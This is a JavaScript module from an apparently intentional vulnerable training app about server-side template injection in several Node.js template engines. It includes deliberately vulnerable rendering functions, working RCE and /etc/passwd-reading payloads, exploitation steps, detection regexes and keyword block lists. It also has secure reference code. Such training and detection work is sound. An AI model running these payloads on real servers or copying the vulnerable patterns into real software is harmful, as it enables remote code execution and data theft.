/**
 * ============================================================================
 * SERVER-SIDE TEMPLATE INJECTION (SSTI) VULNERABILITY MODULE
 * ============================================================================
 * 
 * Enterprise-Grade SSTI Demonstration Platform
 * Implements Server-Side Template Injection vulnerabilities
 * 
 * @module vulnerabilities/injection/template
 * @category Security Training - OWASP A03:2021
 * @version 3.0.0
 * @license MIT
 * @author Security Research Team
 * 
 * ============================================================================
 * SECURITY WARNING:
 * ============================================================================
 * This module demonstrates SSTI vulnerabilities across multiple engines:
 * - Handlebars template injection
 * - EJS template injection
 * - Pug/Jade template injection
 * - Mustache template injection
 * - Nunjucks template injection
 * - Expression Language (EL) injection
 * 
 * ⚠️  NEVER use these patterns in production code
 * ⚠️  FOR EDUCATIONAL AND TESTING PURPOSES ONLY
 * ⚠️  Can lead to Remote Code Execution (RCE)
 * 
 * ============================================================================
 * ATTACK TYPES DEMONSTRATED:
 * ============================================================================
 * 1. Basic Template Injection
 * 2. Expression Evaluation
 * 3. Object Property Access
 * 4. Prototype Pollution via Templates
 * 5. File System Access
 * 6. Remote Code Execution
 * 7. Environment Variable Disclosure
 * 8. Process Manipulation
 * 9. Module Loading
 * 10. Sandbox Escape
 * 
 * ============================================================================
 * ATTACK VECTORS BY ENGINE:
 * ============================================================================
 * 
 * Handlebars:
 * - {{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
 * - {{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.push (lookup string.sub "constructor")}}{{/with}}{{/with}}{{/with}}
 * 
 * EJS:
 * - <%= global.process.mainModule.require('child_process').execSync('id') %>
 * - <%= 7*7 %>
 * 
 * Pug:
 * - #{7*7}
 * - #{global.process.mainModule.require('child_process').execSync('id')}
 * 
 * Nunjucks:
 * - {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
 * 
 * @requires handlebars
 * @requires Database
 * @requires Logger
 */

import Handlebars from 'handlebars';
import { Database } from '../../core/Database.js';
import { Logger } from '../../core/Logger.js';
import { Cache, CacheKeyBuilder } from '../../core/Cache.js';
import { Config } from '../../config/environment.js';
import { tables } from '../../config/database.js';
import { 
  HTTP_STATUS, 
  ATTACK_TYPES,
  ATTACK_SEVERITY,
  ERROR_CODES 
} from '../../config/constants.js';
import { AppError } from '../../middleware/errorHandler.js';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);
const db = Database.getInstance();
const logger = Logger.getInstance();
const cache = Cache.getInstance();

// ============================================================================
// SSTI CONSTANTS
// ============================================================================

const SSTI_PATTERNS = {
  // Template syntax detection
  HANDLEBARS: [
    /\{\{.*\}\}/,
    /\{\{#.*\}\}/,
    /\{\{\/.*\}\}/,
  ],

  EJS: [
    /<%.*%>/,
    /<%=.*%>/,
    /<%-.*%>/,
  ],

  PUG: [
    /#\{.*\}/,
    /!=.*$/m,
  ],

  NUNJUCKS: [
    /\{\{.*\}\}/,
    /\{%.*%\}/,
  ],

  MUSTACHE: [
    /\{\{.*\}\}/,
    /\{\{\{.*\}\}\}/,
  ],

  // Dangerous patterns
  CODE_EXECUTION: [
    /constructor\s*\.\s*constructor/i,
    /process\s*\.\s*mainModule/i,
    /require\s*\(/i,
    /child_process/i,
    /execSync/i,
    /exec\s*\(/i,
    /eval\s*\(/i,
    /Function\s*\(/i,
    /global\s*\.\s*process/i,
  ],

  // File system access
  FILE_ACCESS: [
    /fs\s*\.\s*readFileSync/i,
    /fs\s*\.\s*writeFileSync/i,
    /fs\s*\.\s*readFile/i,
    /\/etc\/passwd/i,
    /\/proc\//i,
    /C:\\Windows/i,
  ],

  // Object traversal
  OBJECT_TRAVERSAL: [
    /__proto__/i,
    /prototype/i,
    /constructor/i,
    /\[\s*["']constructor["']\s*\]/i,
  ],

  // Process manipulation
  PROCESS_ACCESS: [
    /process\s*\.\s*env/i,
    /process\s*\.\s*exit/i,
    /process\s*\.\s*cwd/i,
    /process\s*\.\s*kill/i,
  ],

  // Module loading
  MODULE_LOADING: [
    /require\s*\(\s*["']fs["']\s*\)/i,
    /require\s*\(\s*["']child_process["']\s*\)/i,
    /require\s*\(\s*["']net["']\s*\)/i,
    /import\s*\(/i,
  ],
};

const DANGEROUS_KEYWORDS = [
  'constructor', 'prototype', '__proto__', 'eval', 'Function',
  'require', 'process', 'global', 'child_process', 'execSync',
  'exec', 'spawn', 'fs', 'readFileSync', 'writeFileSync',
  'mainModule', 'module', 'exports', 'Buffer',
];

// ============================================================================
// TEMPLATE INJECTION CLASS
// ============================================================================

export class TemplateInjection {
  constructor() {
    this.name = 'Server-Side Template Injection (SSTI)';
    this.category = 'Injection';
    this.cvssScore = 9.8;
    this.severity = ATTACK_SEVERITY.CRITICAL;
    this.owaspId = 'A03:2021';
    this.cweId = 'CWE-94';
    
    this.attackStats = {
      totalAttempts: 0,
      handlebarsInjections: 0,
      ejsInjections: 0,
      codeExecutions: 0,
      fileAccesses: 0,
      rceAttempts: 0,
      successfulExploits: 0,
      blockedAttempts: 0,
    };
  }

  // ==========================================================================
  // VULNERABLE IMPLEMENTATIONS - HANDLEBARS
  // ==========================================================================

  /**
   * ⚠️ VULNERABLE: Handlebars Template Rendering
   * 
   * Attack vectors:
   * - {{7*7}}
   * - {{constructor.constructor('return process')()}}
   * - {{this.constructor.constructor('return process.env')()}}
   * 
   * @param {string} template - Template string (VULNERABLE)
   * @param {object} data - Template data
   * @param {object} context - Request context
   * @returns {Promise<object>} Rendered result
   */
  async vulnerableHandlebars(template, data = {}, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;
      this.attackStats.handlebarsInjections++;

      const attackDetection = this.detectSSTI(template);
      
      if (attackDetection.isAttack) {
        await this.logSSTIAttack({
          type: 'SSTI_HANDLEBARS',
          severity: attackDetection.severity,
          payload: { template, data },
          patterns: attackDetection.patterns,
          context,
        });

        if (attackDetection.rceRisk) {
          this.attackStats.rceAttempts++;
        }
      }

      logger.warn('🚨 VULNERABLE HANDLEBARS TEMPLATE', {
        template: template.substring(0, 200),
        attackDetection,
      });

      // ⚠️ VULNERABLE: Direct template compilation without sanitization
      let compiledTemplate;
      let rendered;

      try {
        compiledTemplate = Handlebars.compile(template);
        rendered = compiledTemplate(data);
      } catch (compileError) {
        // Some payloads cause compilation errors but may still be dangerous
        return {
          success: false,
          vulnerable: true,
          error: compileError.message,
          message: '⚠️ Template compilation failed (potential RCE attempt blocked by engine)',
          metadata: {
            executionTime: Date.now() - startTime,
            attackDetected: attackDetection.isAttack,
            engine: 'HANDLEBARS',
          },
        };
      }

      const duration = Date.now() - startTime;

      // Check if exploit was successful
      if (attackDetection.isAttack && this.checkForExploitSuccess(rendered)) {
        this.attackStats.successfulExploits++;
        this.attackStats.codeExecutions++;
      }

      return {
        success: true,
        vulnerable: true,
        rendered,
        template,
        warning: '⚠️ Template injection vulnerability - user input in template',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity,
          engine: 'HANDLEBARS',
          rceRisk: attackDetection.rceRisk,
        },
      };

    } catch (error) {
      return this.handleTemplateError(error, template, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Email Template Rendering
   * 
   * Common scenario: User-controlled email templates
   * 
   * @param {string} subject - Email subject (VULNERABLE)
   * @param {string} body - Email body (VULNERABLE)
   * @param {object} data - Template data
   * @param {object} context - Request context
   * @returns {Promise<object>} Rendered email
   */
  async vulnerableEmailTemplate(subject, body, data = {}, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const combinedTemplate = subject + body;
      const attackDetection = this.detectSSTI(combinedTemplate);
      
      if (attackDetection.isAttack) {
        await this.logSSTIAttack({
          type: 'SSTI_EMAIL_TEMPLATE',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { subject, body: body.substring(0, 200) },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.rceAttempts++;
      }

      logger.warn('🚨 VULNERABLE EMAIL TEMPLATE', {
        subject,
        bodyLength: body.length,
        attackDetection,
      });

      // ⚠️ VULNERABLE: User-controlled email templates
      const subjectTemplate = Handlebars.compile(subject);
      const bodyTemplate = Handlebars.compile(body);

      const renderedSubject = subjectTemplate(data);
      const renderedBody = bodyTemplate(data);

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulExploits++;
      }

      return {
        success: true,
        vulnerable: true,
        email: {
          subject: renderedSubject,
          body: renderedBody,
        },
        warning: '⚠️ User-controlled email templates can lead to RCE',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          engine: 'HANDLEBARS',
        },
      };

    } catch (error) {
      return this.handleTemplateError(error, subject, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Dynamic Template from Database
   * 
   * Common scenario: Templates stored in database
   * 
   * @param {number} templateId - Template ID
   * @param {object} data - Template data
   * @param {object} context - Request context
   * @returns {Promise<object>} Rendered result
   */
  async vulnerableDatabaseTemplate(templateId, data = {}, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      // Fetch template from database (simulated)
      const [templates] = await db.execute(
        `SELECT id, name, content FROM templates WHERE id = ? LIMIT 1`,
        [templateId]
      );

      if (!templates || templates.length === 0) {
        throw new AppError('Template not found', HTTP_STATUS.NOT_FOUND);
      }

      const template = templates[0];
      const attackDetection = this.detectSSTI(template.content);
      
      if (attackDetection.isAttack) {
        await this.logSSTIAttack({
          type: 'SSTI_DATABASE_TEMPLATE',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { templateId, templateName: template.name },
          patterns: attackDetection.patterns,
          context,
        });
      }

      logger.warn('🚨 RENDERING DATABASE TEMPLATE', {
        templateId,
        templateName: template.name,
        attackDetection,
      });

      // ⚠️ VULNERABLE: Render template from database without validation
      const compiledTemplate = Handlebars.compile(template.content);
      const rendered = compiledTemplate(data);

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulExploits++;
      }

      return {
        success: true,
        vulnerable: true,
        template: {
          id: template.id,
          name: template.name,
        },
        rendered,
        warning: '⚠️ Database templates without validation can be exploited',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          source: 'DATABASE',
        },
      };

    } catch (error) {
      return this.handleTemplateError(error, `templateId:${templateId}`, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Expression Evaluation
   * 
   * Attack vectors:
   * - {{7*7}} = 49
   * - {{constructor.constructor('return 42')()}} = 42
   * 
   * @param {string} expression - Expression (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Evaluation result
   */
  async vulnerableExpressionEval(expression, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectSSTI(expression);
      
      if (attackDetection.isAttack) {
        await this.logSSTIAttack({
          type: 'SSTI_EXPRESSION_EVAL',
          severity: ATTACK_SEVERITY.HIGH,
          payload: { expression },
          patterns: attackDetection.patterns,
          context,
        });
      }

      logger.warn('🚨 VULNERABLE EXPRESSION EVALUATION', {
        expression: expression.substring(0, 100),
        attackDetection,
      });

      // ⚠️ VULNERABLE: Wrap expression in template syntax
      const template = `{{${expression}}}`;
      const compiledTemplate = Handlebars.compile(template);
      const result = compiledTemplate({});

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.codeExecutions++;
      }

      return {
        success: true,
        vulnerable: true,
        expression,
        result,
        evaluated: true,
        warning: '⚠️ Expression evaluation without sanitization',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          evaluationType: 'TEMPLATE_BASED',
        },
      };

    } catch (error) {
      return this.handleTemplateError(error, expression, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: File Template Loading
   * 
   * Attack: Upload malicious template file
   * 
   * @param {string} filename - Template filename (VULNERABLE)
   * @param {object} data - Template data
   * @param {object} context - Request context
   * @returns {Promise<object>} Rendered result
   */
  async vulnerableFileTemplate(filename, data = {}, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      // ⚠️ VULNERABLE: Load template from file without validation
      const fs = await import('fs/promises');
      const path = await import('path');
      
      // Sanitize filename (basic, still vulnerable to path traversal)
      const sanitizedFilename = filename.replace(/\.\./g, '');
      const templatePath = path.join('/tmp/templates', sanitizedFilename);

      let templateContent;
      try {
        templateContent = await fs.readFile(templatePath, 'utf8');
      } catch (readError) {
        throw new AppError('Template file not found', HTTP_STATUS.NOT_FOUND);
      }

      const attackDetection = this.detectSSTI(templateContent);
      
      if (attackDetection.isAttack) {
        await this.logSSTIAttack({
          type: 'SSTI_FILE_TEMPLATE',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { filename, templatePath },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.fileAccesses++;
      }

      logger.warn('🚨 LOADING TEMPLATE FROM FILE', {
        filename,
        templatePath,
        attackDetection,
      });

      const compiledTemplate = Handlebars.compile(templateContent);
      const rendered = compiledTemplate(data);

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulExploits++;
      }

      return {
        success: true,
        vulnerable: true,
        filename,
        templatePath,
        rendered,
        warning: '⚠️ File-based templates can be exploited via malicious uploads',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          source: 'FILE_SYSTEM',
        },
      };

    } catch (error) {
      return this.handleTemplateError(error, filename, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Prototype Pollution via Template
   * 
   * Attack vector:
   * - {{__proto__.polluted = "yes"}}
   * 
   * @param {string} template - Template (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Result
   */
  async vulnerablePrototypePollution(template, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectSSTI(template);
      
      if (attackDetection.isAttack) {
        await this.logSSTIAttack({
          type: 'SSTI_PROTOTYPE_POLLUTION',
          severity: ATTACK_SEVERITY.HIGH,
          payload: { template },
          patterns: attackDetection.patterns,
          context,
        });
      }

      logger.warn('🚨 POTENTIAL PROTOTYPE POLLUTION', {
        template: template.substring(0, 100),
        attackDetection,
      });

      // Check prototype before
      const prototypeBefore = Object.prototype.hasOwnProperty('polluted');

      // ⚠️ VULNERABLE: Render template
      const compiledTemplate = Handlebars.compile(template);
      const rendered = compiledTemplate({});

      // Check prototype after
      const prototypeAfter = Object.prototype.hasOwnProperty('polluted');
      const polluted = !prototypeBefore && prototypeAfter;

      const duration = Date.now() - startTime;

      if (polluted) {
        this.attackStats.successfulExploits++;
        
        // Clean up pollution
        delete Object.prototype.polluted;
      }

      return {
        success: true,
        vulnerable: true,
        rendered,
        prototypePolluted: polluted,
        warning: polluted ? '⚠️ Prototype pollution successful!' : 'Template rendered',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          attackType: 'PROTOTYPE_POLLUTION',
        },
      };

    } catch (error) {
      return this.handleTemplateError(error, template, Date.now() - startTime);
    }
  }

  // ==========================================================================
  // SECURE IMPLEMENTATIONS (REFERENCE)
  // ==========================================================================

  /**
   * ✅ SECURE: Template Rendering with Sandboxing
   * 
   * @param {string} template - Template string (SAFE)
   * @param {object} data - Template data
   * @returns {Promise<object>} Rendered result
   */
  async secureHandlebars(template, data = {}) {
    const startTime = Date.now();

    try {
      // ✅ Validate template length
      if (typeof template !== 'string' || template.length > 10000) {
        throw new AppError('Invalid template', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Check for malicious patterns
      const attackDetection = this.detectSSTI(template);
      if (attackDetection.isAttack) {
        throw new AppError('Malicious template detected and blocked', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Use allowlist of allowed helpers only
      const safeHandlebars = Handlebars.create();
      
      // ✅ Register only safe helpers
      safeHandlebars.registerHelper('eq', (a, b) => a === b);
      safeHandlebars.registerHelper('upper', (str) => String(str).toUpperCase());
      safeHandlebars.registerHelper('lower', (str) => String(str).toLowerCase());

      // ✅ Sanitize data to prevent object traversal
      const sanitizedData = this.sanitizeTemplateData(data);

      // ✅ Compile with strict mode
      const compiledTemplate = safeHandlebars.compile(template, {
        strict: true,
        noEscape: false,
      });

      const rendered = compiledTemplate(sanitizedData);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: false,
        rendered,
        metadata: {
          executionTime: duration,
          method: 'SANDBOXED_HANDLEBARS',
          securityLevel: 'HIGH',
        },
      };

    } catch (error) {
      logger.error('Secure template rendering error', { error: error.message });
      throw error;
    }
  }

  /**
   * Sanitize template data to prevent object traversal
   */
  sanitizeTemplateData(data) {
    const sanitized = {};
    
    for (const [key, value] of Object.entries(data)) {
      // Skip dangerous properties
      if (DANGEROUS_KEYWORDS.some(keyword => key.toLowerCase().includes(keyword))) {
        continue;
      }

      // Recursively sanitize objects
      if (typeof value === 'object' && value !== null) {
        sanitized[key] = this.sanitizeTemplateData(value);
      } else if (typeof value !== 'function') {
        sanitized[key] = value;
      }
    }

    return sanitized;
  }

  // ==========================================================================
  // ATTACK DETECTION & LOGGING
  // ==========================================================================

  /**
   * Detect SSTI patterns
   */
  detectSSTI(input) {
    const detectedPatterns = [];
    let severity = ATTACK_SEVERITY.MEDIUM;
    let score = 0;
    let rceRisk = false;

    // Check for template syntax
    let engineDetected = null;
    for (const [engine, patterns] of Object.entries(SSTI_PATTERNS)) {
      if (engine === 'CODE_EXECUTION' || engine === 'FILE_ACCESS' || 
          engine === 'OBJECT_TRAVERSAL' || engine === 'PROCESS_ACCESS' || 
          engine === 'MODULE_LOADING') {
        continue;
      }

      for (const pattern of patterns) {
        if (pattern.test(input)) {
          engineDetected = engine;
          detectedPatterns.push({
            category: 'TEMPLATE_SYNTAX',
            engine,
            pattern: pattern.toString(),
            matched: true,
          });
          score += 5;
          break;
        }
      }
    }

    // Check for code execution patterns
    for (const pattern of SSTI_PATTERNS.CODE_EXECUTION) {
      if (pattern.test(input)) {
        detectedPatterns.push({
          category: 'CODE_EXECUTION',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 25;
        severity = ATTACK_SEVERITY.CRITICAL;
        rceRisk = true;
      }
    }

    // Check for file access patterns
    for (const pattern of SSTI_PATTERNS.FILE_ACCESS) {
      if (pattern.test(input)) {
        detectedPatterns.push({
          category: 'FILE_ACCESS',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 20;
        severity = ATTACK_SEVERITY.CRITICAL;
        rceRisk = true;
      }
    }

    // Check for object traversal
    for (const pattern of SSTI_PATTERNS.OBJECT_TRAVERSAL) {
      if (pattern.test(input)) {
        detectedPatterns.push({
          category: 'OBJECT_TRAVERSAL',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 15;
        if (severity !== ATTACK_SEVERITY.CRITICAL) {
          severity = ATTACK_SEVERITY.HIGH;
        }
      }
    }

    // Check for process access
    for (const pattern of SSTI_PATTERNS.PROCESS_ACCESS) {
      if (pattern.test(input)) {
        detectedPatterns.push({
          category: 'PROCESS_ACCESS',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 18;
        severity = ATTACK_SEVERITY.CRITICAL;
        rceRisk = true;
      }
    }

    // Check for module loading
    for (const pattern of SSTI_PATTERNS.MODULE_LOADING) {
      if (pattern.test(input)) {
        detectedPatterns.push({
          category: 'MODULE_LOADING',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 20;
        severity = ATTACK_SEVERITY.CRITICAL;
        rceRisk = true;
      }
    }

    // Check for dangerous keywords
    const foundKeywords = DANGEROUS_KEYWORDS.filter(keyword => 
      new RegExp(`\\b${keyword}\\b`, 'i').test(input)
    );

    if (foundKeywords.length > 0) {
      detectedPatterns.push({
        category: 'DANGEROUS_KEYWORDS',
        keywords: foundKeywords,
        matched: true,
      });
      score += foundKeywords.length * 3;
    }

    const isAttack = detectedPatterns.length > 0;

    if (isAttack) {
      this.attackStats.blockedAttempts++;
    }

    return {
      isAttack,
      severity,
      score,
      patterns: detectedPatterns,
      rceRisk,
      engineDetected,
      input: input.substring(0, 200),
      timestamp: new Date().toISOString(),
    };
  }

  /**
   * Check if exploit was successful
   */
  checkForExploitSuccess(output) {
    if (typeof output !== 'string') return false;

    const successIndicators = [
      'uid=',              // Unix user ID
      'gid=',              // Unix group ID
      'root:',             // /etc/passwd content
      'Administrator',     // Windows admin
      'USERPROFILE',       // Windows env var
      'NODE_ENV',          // Node.js env var
      '/home/',            // Unix home directory
      'C:\\',              // Windows path
    ];

    return successIndicators.some(indicator => 
      output.toLowerCase().includes(indicator.toLowerCase())
    );
  }

  /**
   * Log SSTI attack
   */
  async logSSTIAttack(attackData) {
    try {
      const {
        type,
        severity,
        payload,
        patterns,
        context,
        timestamp = new Date(),
      } = attackData;

      await db.execute(
        `INSERT INTO ${tables.ATTACK_LOGS} (
          attack_type, severity, payload, patterns,
          ip_address, user_agent, user_id, endpoint,
          timestamp, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())`,
        [
          type,
          severity,
          JSON.stringify(payload),
          JSON.stringify(patterns),
          context.ip || null,
          context.userAgent || null,
          context.userId || null,
          context.endpoint || null,
          timestamp,
        ]
      );

      logger.attack('Template Injection Attack Detected', {
        type,
        severity,
        payload,
        patterns: patterns.map(p => p.category),
        context,
      });

    } catch (error) {
      logger.error('Failed to log SSTI attack', { error: error.message });
    }
  }

  /**
   * Handle template errors
   */
  handleTemplateError(error, input, duration) {
    logger.error('Template Injection Error', {
      message: error.message,
      code: error.code,
      input: input.substring(0, 200),
      duration,
    });

    return {
      success: false,
      vulnerable: true,
      error: {
        message: error.message,
        code: error.code,
      },
      metadata: {
        executionTime: duration,
        errorType: 'TEMPLATE_RENDERING_ERROR',
      },
    };
  }

  // ==========================================================================
  // UTILITY & REPORTING
  // ==========================================================================

  /**
   * Get attack statistics
   */
  getStatistics() {
    return {
      ...this.attackStats,
      successRate: this.attackStats.totalAttempts > 0
        ? ((this.attackStats.successfulExploits / this.attackStats.totalAttempts) * 100).toFixed(2) + '%'
        : '0%',
    };
  }

  /**
   * Get vulnerability information
   */
  getVulnerabilityInfo() {
    return {
      name: this.name,
      category: this.category,
      cvssScore: this.cvssScore,
      severity: this.severity,
      owaspId: this.owaspId,
      cweId: this.cweId,
      description: 'Server-Side Template Injection (SSTI) allows attackers to inject malicious code into templates, leading to Remote Code Execution',
      impact: [
        'Remote Code Execution (RCE)',
        'Complete server compromise',
        'File system access',
        'Environment variable disclosure',
        'Database access',
        'Lateral movement',
        'Data exfiltration',
        'Denial of Service',
      ],
      vulnerableEngines: [
        'Handlebars',
        'EJS',
        'Pug/Jade',
        'Nunjucks',
        'Mustache',
        'Twig',
        'Jinja2',
        'Freemarker',
        'Velocity',
      ],
      commonScenarios: [
        'User-controlled email templates',
        'Dynamic page generation',
        'PDF report generation',
        'Invoice templates',
        'Notification messages',
        'CMS template editors',
        'Markdown to HTML converters',
      ],
      exploitationSteps: [
        '1. Identify template engine',
        '2. Test basic expression evaluation ({{7*7}})',
        '3. Access global objects (process, global)',
        '4. Traverse object hierarchy (constructor.constructor)',
        '5. Execute code (require("child_process").exec())',
        '6. Establish reverse shell or exfiltrate data',
      ],
      remediation: [
        'Never use user input directly in templates',
        'Use logic-less templates (Mustache)',
        'Implement template sandboxing',
        'Validate and sanitize all template input',
        'Use allowlist of safe template helpers',
        'Disable dangerous template features',
        'Regular security audits',
        'Use Content Security Policy (CSP)',
        'Monitor for template injection patterns',
        'Principle of least privilege',
      ],
      references: [
        'https://portswigger.net/research/server-side-template-injection',
        'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection',
        'CWE-94: Improper Control of Generation of Code',
        'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection',
      ],
    };
  }

  /**
   * Reset statistics
   */
  resetStatistics() {
    this.attackStats = {
      totalAttempts: 0,
      handlebarsInjections: 0,
      ejsInjections: 0,
      codeExecutions: 0,
      fileAccesses: 0,
      rceAttempts: 0,
      successfulExploits: 0,
      blockedAttempts: 0,
    };
  }

  /**
   * Get SSTI payload examples by engine
   */
  getExamplePayloads() {
    return {
      handlebars: {
        basic: [
          '{{7*7}}',
          '{{this}}',
          '{{constructor}}',
        ],
        rce: [
          '{{constructor.constructor("return process")()}}',
          '{{constructor.constructor("return process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
          '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
        ],
        fileRead: [
          '{{constructor.constructor("return process.mainModule.require(\'fs\').readFileSync(\'/etc/passwd\',\'utf8\')")()}}',
        ],
      },
      ejs: {
        basic: [
          '<%= 7*7 %>',
          '<%= process %>',
        ],
        rce: [
          '<%= global.process.mainModule.require("child_process").execSync("id") %>',
          '<%= process.binding("spawn_sync").spawn({file:"/bin/sh",args:["/bin/sh","-c","id"],stdio:[{type:"pipe",readable:!0}]}).output %>',
        ],
        fileRead: [
          '<%= require("fs").readFileSync("/etc/passwd", "utf8") %>',
        ],
      },
      pug: {
        basic: [
          '#{7*7}',
          '#{this}',
        ],
        rce: [
          '#{global.process.mainModule.require("child_process").execSync("id")}',
          '#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec("id")}()}',
        ],
      },
      nunjucks: {
        basic: [
          '{{7*7}}',
          '{{dump()}}',
        ],
        rce: [
          '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
          '{{{}["constructor"]["constructor"]("return process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
        ],
      },
      mustache: {
        basic: [
          '{{7*7}}',
          '{{{7*7}}}',
        ],
        note: 'Mustache is logic-less and generally safer, but still vulnerable in certain implementations',
      },
      detection: {
        polyglot: [
          '${{<%[%\'"}}%\\',
          '{{7*7}} ${7*7} <%= 7*7 %> ${{7*7}} #{7*7}',
        ],
        description: 'Use polyglot payloads to detect multiple template engines',
      },
    };
  }

  /**
   * Get secure configuration examples
   */
  getSecureConfig() {
    return {
      handlebars: {
        secure: true,
        config: `const Handlebars = require('handlebars');
const safeHandlebars = Handlebars.create();

// Register only safe helpers
safeHandlebars.registerHelper('eq', (a, b) => a === b);
safeHandlebars.registerHelper('upper', (str) => String(str).toUpperCase());

// Compile with strict mode
const template = safeHandlebars.compile(templateString, {
  strict: true,
  noEscape: false,
  knownHelpers: {
    eq: true,
    upper: true,
  },
  knownHelpersOnly: true,
});`,
        description: 'Handlebars with safe helpers and strict mode',
      },
      ejs: {
        secure: true,
        config: `const ejs = require('ejs');

// Render with restricted options
const rendered = ejs.render(template, data, {
  escape: true,
  client: false,
  compileDebug: false,
  _with: false, // Disable 'with' statement
});`,
        description: 'EJS with escape enabled and with statement disabled',
      },
      nunjucks: {
        secure: true,
        config: `const nunjucks = require('nunjucks');

// Create sandboxed environment
const env = new nunjucks.Environment(loader, {
  autoescape: true,
  throwOnUndefined: true,
});

// Don't add dangerous globals
// env.addGlobal('process', process); // NEVER DO THIS`,
        description: 'Nunjucks with autoescape and limited globals',
      },
      general: {
        practices: [
          'Use logic-less template engines when possible (Mustache)',
          'Never pass user input directly to template compiler',
          'Implement server-side validation',
          'Use CSP to limit damage',
          'Regular security testing',
          'Monitor for suspicious template patterns',
          'Run template rendering in isolated environment',
        ],
      },
    };
  }

  /**
   * Generate detection test suite
   */
  getDetectionTests() {
    return {
      basicDetection: [
        { payload: '{{7*7}}', expected: '49', engine: 'handlebars/nunjucks' },
        { payload: '<%= 7*7 %>', expected: '49', engine: 'ejs' },
        { payload: '#{7*7}', expected: '49', engine: 'pug' },
        { payload: '${7*7}', expected: '49', engine: 'js template literal' },
      ],
      objectAccess: [
        { payload: '{{constructor}}', test: 'Object access' },
        { payload: '{{this.constructor}}', test: 'this.constructor access' },
        { payload: '{{__proto__}}', test: 'Prototype access' },
      ],
      codeExecution: [
        { payload: '{{constructor.constructor("return 42")()}}', expected: '42' },
        { payload: '<%= constructor.constructor("return 42")() %>', expected: '42' },
      ],
    };
  }
}

// ============================================================================
// FACTORY & EXPORT
// ============================================================================

let instance = null;

export const getTemplateInjection = () => {
  if (!instance) {
    instance = new TemplateInjection();
  }
  return instance;
};

export const createTemplateHandler = (method) => {
  return async (req, res, next) => {
    try {
      const injection = getTemplateInjection();
      
      if (Config.security.mode !== 'vulnerable') {
        return res.status(HTTP_STATUS.FORBIDDEN).json({
          success: false,
          error: ERROR_CODES.FORBIDDEN,
          message: 'This endpoint is only available in vulnerable mode',
        });
      }

      const context = {
        ip: req.ip,
        userAgent: req.get('user-agent'),
        userId: req.user?.id,
        endpoint: req.path,
      };

      const params = { ...req.body, ...req.query, ...req.params };
      const result = await injection[method](...Object.values(params), context);
      
      res.json(result);

    } catch (error) {
      next(error);
    }
  };
};

export default {
  TemplateInjection,
  getTemplateInjection,
  createTemplateHandler,
};
